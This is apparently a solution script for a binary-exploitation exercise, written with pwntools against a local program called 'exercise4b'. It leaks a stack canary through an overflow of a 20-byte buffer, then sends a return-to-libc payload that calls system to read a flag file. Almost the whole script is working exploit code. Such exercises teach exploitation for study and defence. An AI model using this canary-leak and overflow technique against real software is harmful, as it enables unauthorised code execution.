#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# r = start()
# r.send(b'imposter\0\x0a')
# print(r.recvuntil(b'Enter the secret password:\n'))

# r.send(b'TEST\0\x0a')
# print(r.recv())

RET_ADDR = 0x401343
r = start()
SYSTEM_ADDR = r.libc.symbols['system']
# LOAD_NAME_TO_RDI_ADDRESS = 0x40130C

r.sendline(b'cat flag\0')

r.recvuntil(b'Enter the secret password:\n')

BUF_SIZE = 20
leak = cyclic(BUF_SIZE - 1) + b'\x0a'
r.send(leak)

r.recvline_contains(cyclic(8))
canary_raw = r.recvline().split(b' is ')[0]
canary = int.from_bytes(canary_raw, byteorder='little')

print(canary_raw)

r.recvuntil(b'Enter the secret password:\n')

payload = cyclic(BUF_SIZE)
payload += pack(canary, 64)
payload += cyclic(12)
# payload += pack(LOAD_NAME_TO_RDI_ADDRESS, 64)
payload += pack(RET_ADDR, 64)
payload += pack(SYSTEM_ADDR, 64)
payload += b'\x0a'

r.send(payload)

pause(3)
a = r.recvall()
print(a)
